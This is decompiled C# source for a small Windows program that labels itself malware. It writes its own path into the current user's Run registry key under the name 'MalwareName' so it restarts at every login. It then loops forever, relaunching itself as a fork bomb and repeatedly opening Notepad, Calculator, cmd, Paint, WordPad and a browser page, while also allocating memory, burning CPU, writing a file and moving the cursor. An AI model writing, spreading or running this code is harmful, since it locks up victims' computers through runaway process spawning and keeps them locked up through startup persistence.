// Decompiled with JetBrains decompiler
// Type: ConsoleApp1.Program
// Assembly: ConsoleApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CF3945D1-ECF2-4E48-B13E-CCCF577E9ADE

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

#nullable disable
namespace ConsoleApp1;

internal class Program
{
  [DllImport("user32.dll")]
  private static extern bool SetCursorPos(int X, int Y);

  private static void Main(string[] args)
  {
    string location = Assembly.GetExecutingAssembly().Location;
    string fileName = "https://www.google.co.uk/";
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    if (registryKey != null)
    {
      registryKey.SetValue("MalwareName", (object) location);
      registryKey.Close();
    }
    while (true)
    {
      try
      {
        Process.Start(location);
      }
      catch
      {
      }
      try
      {
        Process.Start("Notepad.exe");
      }
      catch
      {
      }
      try
      {
        Process.Start("calc.exe");
      }
      catch
      {
      }
      try
      {
        Process.Start("cmd.exe");
      }
      catch
      {
      }
      try
      {
        Process.Start(new ProcessStartInfo(fileName)
        {
          UseShellExecute = true
        });
      }
      catch
      {
      }
      try
      {
        Process.Start("mspaint.exe");
      }
      catch
      {
      }
      try
      {
        Process.Start("write.exe");
      }
      catch
      {
      }
      try
      {
        byte[] numArray = new byte[100000000];
      }
      catch
      {
      }
      try
      {
        for (int d = 0; d < 1000000; ++d)
          Math.Sqrt((double) d);
      }
      catch
      {
      }
      try
      {
        File.WriteAllText("tempfile.txt", "This is a test.");
      }
      catch
      {
      }
      try
      {
        Program.SetCursorPos(500, 300);
      }
      catch
      {
      }
    }
  }
}
